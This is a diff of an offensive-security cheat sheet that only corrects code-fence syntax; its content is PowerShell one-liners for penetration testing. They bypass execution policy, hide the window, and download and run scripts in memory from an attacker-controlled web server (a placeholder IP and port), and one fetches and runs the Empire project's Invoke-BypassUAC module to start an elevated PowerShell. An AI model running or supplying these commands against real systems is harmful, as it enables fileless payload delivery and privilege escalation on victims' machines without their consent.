@@ -1,11 +1,11 @@
 ## Start up WebServer
 
 ## Run script in memory:
-'''ps
+```ps
 powershell.exe -Exec Bypass -NoP -NonI -W Hidden IEX(New-Object System.Net.WebClient).DownloadString('http://<LocalIPAddress>:<PORT>/FILE')
 
 powershell.exe -Exec Bypass -NoP -NonI -W Hidden IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/privesc/Invoke-BypassUAC.ps1');Invoke-BypassUAC -Command 'start powershell.exe'
-'''
+```
 
 # In PowerShell:
 IEX((New-Object System.Net.WebClient).DownloadString('http://LocalIPAddress:PORT/FILE'))
